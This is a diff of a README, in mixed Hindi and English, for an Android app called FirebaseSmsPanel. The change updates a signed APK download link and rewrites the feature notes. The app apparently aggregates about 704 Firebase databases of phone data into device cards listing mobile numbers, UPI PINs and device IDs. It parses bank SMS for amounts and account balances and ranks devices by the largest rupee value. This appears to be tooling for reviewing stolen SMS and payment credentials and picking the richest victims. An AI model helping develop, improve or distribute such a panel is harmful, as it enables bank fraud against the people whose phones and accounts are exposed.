@@ -4,8 +4,8 @@ Virtus-style: **TXT** (704 panels = 704 Firebase URLs) → filters → **Start F
 
 ## Signed APK
 
-**Download (latest signed, v1.0.15):**  
-`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0.15-release-signed.apk`
+**Download (latest signed, v1.0.16):**  
+`https://github.com/hivirtusss/V2-testing-done/raw/cursor/firebase-sms-panel-apk-8042/releases/FirebaseSmsPanel-1.0.16-release-signed.apk`
 
 ### Build locally
 
@@ -36,5 +36,6 @@ Har device card: **Mobile**, **UPI PIN**, **Device Id**, **Firebase URL**, **Bat
 
 ## Notes
 
-- Bank filter: `Rs.10000` jaisa amount ab **bina space** bhi parse hota hai; agar amount miss ho lekin credit/debit bank SMS hai to **phir bhi dikhega** (tier sort me `mainBalance` fallback).
+- Sort + tier: har SMS se **max ₹ number** — txn (`Rs.10000`) + **AcBal/CLRBal/AvlBal** (IOB-style) dono; list/device sort ab isi se (pehle sirf “main” balance pick hota tha).
+- Bank filter: amount jo band ke andar na ho to SMS hide; IOB sender (`-IOBCHN-`) bank hint me.
 - 700+ panels: HTTP timeouts lambe rakhe gaye hain.
